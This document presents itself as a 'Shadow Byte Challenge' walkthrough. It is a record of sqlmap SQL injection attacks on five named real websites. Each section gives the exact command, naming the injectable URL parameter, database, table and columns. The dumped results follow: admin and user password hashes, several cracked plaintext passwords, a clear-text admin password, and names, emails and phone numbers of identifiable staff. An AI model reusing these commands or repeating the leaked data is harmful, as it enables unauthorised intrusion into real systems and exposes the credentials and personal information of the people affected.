# Walkthrough Shadow Byte Challenge

SQLi with
<img src="https://upload.wikimedia.org/wikipedia/commons/4/4f/Sqlmap_logo.png" alt="Sqlmap Logo">



### 1. SQL Injection on www.neutralposture.com

**Command:**
```bash
python sqlmap.py -u https://www.neutralposture.com/_site/wpa.php?cat=08 --dump -D '872128_npweb' -T member -C username,password --threads 10
```

**Results:**
```
+-----------+-------------------------------------------+
| username  | password                                  |
+-----------+-------------------------------------------+
| OddThomas | 710ff2fc5b0eeb581e299649c00fcee8          |
| john      | b0a43e60f21feb841a34958e147af087 (hichem) |
+-----------+-------------------------------------------+
```

### 2. SQL Injection on https://gkpgarut.com

**Command:**
```bash
python sqlmap.py -u https://gkpgarut.com/blog/category.php?id=9 -D gkpw7291_dbjemaat -tables --threads 10 --random-agent
```

**Available Databases:**
```
[*] gkpw7291_album
[*] gkpw7291_arsip
[*] gkpw7291_blog
[*] gkpw7291_dbjemaat
[*] gkpw7291_dkgkp
[*] gkpw7291_dt
[*] gkpw7291_gkpgrt
[*] gkpw7291_ib
[*] gkpw7291_inventaris
[*] gkpw7291_pb
[*] gkpw7291_pesan
[*] gkpw7291_shopping
[*] information_schema
```

**Database: gkpw7291_dbjemaat**

**Tables:**
```
+------------+
| setting    |
| tblanggota |
+------------+
```

### 3. SQL Injection on www.gstindia.biz

**Command:**
```bash
python sqlmap.py -u https://www.gstindia.biz/gallery.php?id=13 --dump -D aaojikhaoji_gstindia -T admin -C name,admin_id,email,phone,pwd --threads 10
```

**Available Databases:**
```
[*] aaojikhaoji_gstindia
[*] information_schema
```

**Database: aaojikhaoji_gstindia**

**Table: admin**

**Columns:**
```
+-----------+--------------+
| Column    | Type         |
+-----------+--------------+
| name      | varchar(60)  |
| address   | varchar(100) |
| admin_id  | int(15)      |
| city      | varchar(60)  |
| email     | varchar(60)  |
| phone     | varchar(12)  |
| pwd       | varchar(20)  |
| uid       | varchar(60)  |
| user_type | int(2)       |
+-----------+--------------+
```

**Entry:**
```
+--------+----------+-------+---------+-------------+
| name   | admin_id | email | phone   | pwd         |
+--------+----------+-------+---------+-------------+
| admin  | 1        | NULL  | <blank> | Yahoo@#9870 |
+--------+----------+-------+---------+-------------+
```


### 4. SQL Injection on https://ibs.worldagroforestry.org

```bash
 python sqlmap.py -u "https://ibs.worldagroforestry.org/search.php?category=0&searchText=909" --dump -D ibsworld_db -T tbl_users -C names,email_add,phoneNumber,pass  --threads 10
```

**Available Databases:**
```
[*] ibsworld_db
[*] information_schema
```

**Database: ibsworld_db**

**Tables:**
```
+-----------------------+
| role                  |
| bidder                |
| campaign_date         |
| campaign_date_report  |
| campaign_stats        |
| category              |
| gate_pass             |
| ibs_campaign          |
| item                  |
| item_bids             |
| item_bids_report      |
| item_full_report      |
| item_images           |
| item_report           |
| notification_template |
| notifications         |
| permission            |
| permission_map        |
| role_map              |
| tbl_users             |
+-----------------------+
```

**Table: tbl_users**

**Columns:**
```
+-------------+--------------+
| Column      | Type         |
+-------------+--------------+
| names       | varchar(255) |
| status      | int(11)      |
| addedBy     | int(11)      |
| dateAdded   | timestamp    |
| dateUpdated | timestamp    |
| email_add   | varchar(255) |
| id          | int(11)      |
| pass        | varchar(100) |
| phoneNumber | varchar(45)  |
| updatedBy   | int(11)      |
| user_pic    | varchar(255) |
+-------------+--------------+
```

**Entries:**
```
+------------------------------+----------------------------+--------------+---------------------------------------------+
| names                        | email_add                  | phoneNumber  | pass                                        |
+------------------------------+----------------------------+--------------+---------------------------------------------+
| BloodSec Hackers -Cyb3r6host | podondi@gmail.com          | 254725642410 | 6f5393979d674de36c433b47b7d8908e (admin101) |
| Bid Items Entry              | ibs@cgiar.org              | 254729054240 | 94a21d877c1075fc6273cdb3298f49f2            |
| Brian Wangatia               | b.wangatia@cifor-icraf.org | 254704424580 | f541c685320403dcd5f8149095cc4f65            |
| Martin Kavili                | m.kavili@cifor-icraf.org   | 254721116542 | ee5df35114276c703a16028ae7e968b9            |
| Irene Njoki                  | i.njoki@cifor-icraf.org    | 254727568286 | 8aba70accedec9edbb405ba8f6e7d5d4            |
| Nickson Kibuchi              | n.kibuchi@cifor-icraf.org  | 254706958845 | a6744a7d6d5950df9bcc826b79ee2cb1            |
| Jemimah Ndungu               | j.ndungu@cifor-icraf.org   | 254716062768 | a6744a7d6d5950df9bcc826b79ee2cb1            |
| musx                         | muslihat@musx.team         | 254725612565 | 707ccb987c5a8cd157468df025215e77            |
| simples                      | simples@gmail.com          | 254725642410 | 161ebd7d45089b3446ee4e0d86dbcf92 (P@ssw0rd) |
| RedHorizont                  | redhorizont@hacker.net     | 254766666666 | 16cfcf755992c854f1fbf6138e9733ab            |
| testingtest                  | johns.doe@sei.org          | 254777777777 | 16cfcf755992c854f1fbf6138e9733ab            |
| DiXnXX666                    | fuckyounet@proton.me       | 254712313913 | c9d36694d7d769c432b2bb17cd84672c            |
| "><marquee>abcd              | abcd@abcd.com              | 254727948414 | 32a5ccb5d56be96af35400e4c99b9d70            |
+------------------------------+----------------------------+--------------+---------------------------------------------+
```

### 5. SQL Injection on www.almaflor.id

**Command:**
```bash
python sqlmap.py -u https://www.almaflor.id/galeri-detail.php?id=5 --dump -D almn9987_newalma -Tms_user -C password,username --threads 10
```

**Database: almn9987_newalma**

**Table: ms_user**

**Columns:**
```
+----------+--------------+
| Column   | Type         |
+----------+--------------+
| status   | varchar(15)  |
| id_user  | int(11)      |
| password | varchar(32)  |
| username | varchar(100) |
+----------+--------------+
```

**Entries:**
```
+--------------------------------------------+------------+
| password                                   | username   |
+--------------------------------------------+------------+
| 87198ffc9c6f9aac51736d7d641a4c29           | superadmin |
| 243a579ad59a62febbc664415e974f49 (ruth123) | ruth       |
+--------------------------------------------+------------+
```
